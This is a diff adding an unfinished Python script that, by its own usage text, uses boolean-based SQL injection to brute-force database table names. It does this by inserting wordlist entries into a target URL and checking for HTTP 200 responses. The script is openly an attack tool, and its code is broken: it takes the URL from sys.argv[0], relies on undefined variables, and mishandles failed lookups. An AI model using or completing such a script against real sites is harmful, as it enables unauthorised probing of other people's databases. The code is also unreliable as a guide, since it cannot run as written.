@@ -1,0 +1,50 @@
+import sys
+import requests
+
+def usage():
+    print(f"""
+Usage: {sys.argv[0]} <url>
+
+This script uses boolean-based SQL injection to brute force table and column names.
+
+Arguments:
+  url    - The root URL where the sql injections takes place. Starts with http:// and ends in /
+""")
+    sys.exit(1)
+
+def load_wordlist(wordlist_path):
+    with open(wordlist_path, 'r') as file:
+        wordlist = [line.strip() for line in file]
+    return wordlist
+
+def fuzz_table(command, wordlist):
+    for i in range(len(wordlist)):
+        fuzzed_payload = command.replace("FUZZ", wordlist[i])
+        response_code, response_text = send_request(fuzzed_payload)
+        if response_code == 200:
+            return wordlist[i], response_text
+    return
+
+def send_request(payload):
+    response = requests.get(payload)
+    response_code = response.status_code
+    response_text = response.text
+    return response_code, response_text
+
+def replace_spaces(command):
+    return command.replace(" ", "%20")
+
+if __name__ == "__main__":
+    base_url = sys.argv[0]
+
+    command = base_url + replace_spaces(original_command)
+    wordlist = load_wordlist(wordlist_path)
+    print("Fuzzing to find table name...")
+    table_name, output = fuzz_table(command, wordlist)
+    if output:
+        print(f"Table found: {table_name}")
+    else:
+        print("Table not found")
+
+    # To do: fuzz column name. Replace 'select 1' with 'select FUZZ'
+    # Maybe command should be hardcoded?
